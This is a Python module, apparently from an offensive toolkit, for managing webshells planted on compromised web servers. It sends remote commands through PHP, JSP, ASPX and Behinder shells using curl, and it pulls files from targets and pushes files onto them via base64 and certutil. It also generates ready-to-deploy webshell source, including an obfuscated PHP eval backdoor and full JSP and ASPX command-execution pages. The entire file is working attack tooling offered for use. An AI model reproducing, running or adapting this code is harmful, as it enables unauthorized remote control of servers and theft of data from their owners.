#!/usr/bin/env python3
"""
Webshell Manager — Webshell 统一管理模块

统一管理已上传的 webshell，支持多种类型（一句话/冰蝎/哥斯拉/蚁剑）。
提供命令执行、文件管理、代理转发等功能的统一接口。

用法：
    from webshell_manager import WebshellManager
    wm = WebshellManager()

    # 添加 shell
    wm.add_shell("http://target.com/uploads/shell.php", shell_type="php_eval", password="cmd")

    # 执行命令
    wm.exec_cmd(0, "whoami")

    # 列出所有 shell
    wm.list_shells()
"""

import time
import hashlib
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class Shell:
    """Webshell 实例"""
    id: int = 0
    url: str = ""
    shell_type: str = ""       # php_eval/php_system/jsp/aspx/behinder/godzilla
    password: str = ""
    encryption: str = ""       # none/base64/aes/xor
    os: str = ""               # linux/windows
    status: str = "unknown"    # active/dead/unknown
    last_check: str = ""
    note: str = ""


class WebshellManager:
    """Webshell 管理器"""

    def __init__(self, kb=None):
        self.kb = kb
        self.shells: List[Shell] = []
        self._next_id = 0

    def _run(self, cmd, timeout=30):
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return {"success": r.returncode == 0, "output": (r.stdout + r.stderr)[:5000]}
            except Exception as e:
                return {"success": False, "output": str(e)}

    # ═══════════════════════════════════════════════════════════
    # Shell 管理
    # ═══════════════════════════════════════════════════════════

    def add_shell(self, url: str, shell_type="php_eval", password="cmd",
                  encryption="none", note="") -> Shell:
        """添加 webshell"""
        shell = Shell(
            id=self._next_id, url=url, shell_type=shell_type,
            password=password, encryption=encryption, note=note
        )
        self._next_id += 1
        self.shells.append(shell)
        # 自动探测 OS
        result = self.exec_cmd(shell.id, "echo %OS% 2>nul || uname -s")
        if result.get("success"):
            output = result.get("output", "")
            shell.os = "windows" if "Windows" in output else "linux"
            shell.status = "active"
        return shell

    def list_shells(self) -> List[Dict]:
        """列出所有 shell"""
        return [
            {"id": s.id, "url": s.url, "type": s.shell_type,
             "os": s.os, "status": s.status, "note": s.note}
            for s in self.shells
        ]

    def check_shell(self, shell_id: int) -> Dict:
        """检查 shell 是否存活"""
        result = self.exec_cmd(shell_id, "echo alive")
        shell = self._get_shell(shell_id)
        if shell:
            shell.status = "active" if result.get("success") and "alive" in result.get("output", "") else "dead"
            shell.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
        return {"status": shell.status if shell else "not_found"}

    def check_all(self) -> List[Dict]:
        """批量检查所有 shell"""
        results = []
        for s in self.shells:
            r = self.check_shell(s.id)
            results.append({"id": s.id, "url": s.url, **r})
        return results

    # ═══════════════════════════════════════════════════════════
    # 命令执行
    # ═══════════════════════════════════════════════════════════

    def exec_cmd(self, shell_id: int, command: str) -> Dict:
        """通过 webshell 执行命令"""
        shell = self._get_shell(shell_id)
        if not shell:
            return {"success": False, "output": "Shell not found"}

        if shell.shell_type == "php_eval":
            return self._exec_php_eval(shell, command)
        elif shell.shell_type == "php_system":
            return self._exec_php_system(shell, command)
        elif shell.shell_type == "jsp":
            return self._exec_jsp(shell, command)
        elif shell.shell_type == "aspx":
            return self._exec_aspx(shell, command)
        elif shell.shell_type == "behinder":
            return self._exec_behinder(shell, command)
        else:
            return self._exec_php_system(shell, command)

    def _exec_php_eval(self, shell: Shell, command: str) -> Dict:
        """PHP eval 一句话"""
        payload = base64.b64encode(f"system('{command}');".encode()).decode()
        cmd = f"curl -sk -m 10 '{shell.url}' -d '{shell.password}=eval(base64_decode(\"{payload}\"));' 2>/dev/null"
        return self._run(cmd)

    def _exec_php_system(self, shell: Shell, command: str) -> Dict:
        """PHP system 一句话"""
        cmd = f"curl -sk -m 10 '{shell.url}?{shell.password}={command}' 2>/dev/null"
        return self._run(cmd)

    def _exec_jsp(self, shell: Shell, command: str) -> Dict:
        """JSP shell"""
        cmd = f"curl -sk -m 10 '{shell.url}?{shell.password}={command}' 2>/dev/null"
        return self._run(cmd)

    def _exec_aspx(self, shell: Shell, command: str) -> Dict:
        """ASPX shell"""
        cmd = f"curl -sk -m 10 -X POST '{shell.url}' -d '{shell.password}={command}' 2>/dev/null"
        return self._run(cmd)

    def _exec_behinder(self, shell: Shell, command: str) -> Dict:
        """冰蝎 shell（简化版，实际需要 AES 加密通信）"""
        # 冰蝎需要特定的加密协议，这里用工具调用
        cmd = f"behinder_client -u '{shell.url}' -k '{shell.password}' -c '{command}' 2>/dev/null"
        return self._run(cmd)

    # ═══════════════════════════════════════════════════════════
    # 文件操作
    # ═══════════════════════════════════════════════════════════

    def upload_file(self, shell_id: int, local_file: str, remote_path: str) -> Dict:
        """上传文件到目标"""
        shell = self._get_shell(shell_id)
        if not shell:
            return {"success": False, "output": "Shell not found"}

        # 通过 base64 编码上传
        b64_content = f"$(cat {local_file} | base64)"
        if shell.os == "linux":
            decode_cmd = f"echo '{b64_content}' | base64 -d > {remote_path}"
        else:
            decode_cmd = f"certutil -decode temp.b64 {remote_path}"

        return self.exec_cmd(shell_id, decode_cmd)

    def download_file(self, shell_id: int, remote_path: str) -> Dict:
        """从目标下载文件"""
        shell = self._get_shell(shell_id)
        if not shell:
            return {"success": False, "output": "Shell not found"}

        if shell.os == "linux":
            cmd = f"cat {remote_path} | base64"
        else:
            cmd = f"certutil -encode {remote_path} CON"

        return self.exec_cmd(shell_id, cmd)

    def list_dir(self, shell_id: int, path: str = ".") -> Dict:
        """列目录"""
        shell = self._get_shell(shell_id)
        if not shell:
            return {"success": False, "output": "Shell not found"}

        if shell.os == "linux":
            return self.exec_cmd(shell_id, f"ls -la {path}")
        else:
            return self.exec_cmd(shell_id, f"dir {path}")

    # ═══════════════════════════════════════════════════════════
    # Webshell 生成
    # ═══════════════════════════════════════════════════════════

    def generate_php(self, password="cmd", obfuscate=True) -> str:
        """生成 PHP webshell"""
        if obfuscate:
            # 变量混淆
            var1 = hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
            return f'<?php ${var1}=$_REQUEST["{password}"];@eval(${var1});?>'
        return f'<?php @eval($_REQUEST["{password}"]);?>'

    def generate_jsp(self, password="cmd") -> str:
        """生成 JSP webshell"""
        return f'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("{password}");
if (cmd != null) {{
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
}}
%>'''

    def generate_aspx(self, password="cmd") -> str:
        """生成 ASPX webshell"""
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string c = Request["{password}"];
if (c != null) {{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + c;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}}
%>'''

    # ═══════════════════════════════════════════════════════════
    # 内部方法
    # ═══════════════════════════════════════════════════════════

    def _get_shell(self, shell_id: int) -> Optional[Shell]:
        for s in self.shells:
            if s.id == shell_id:
                return s
        return None
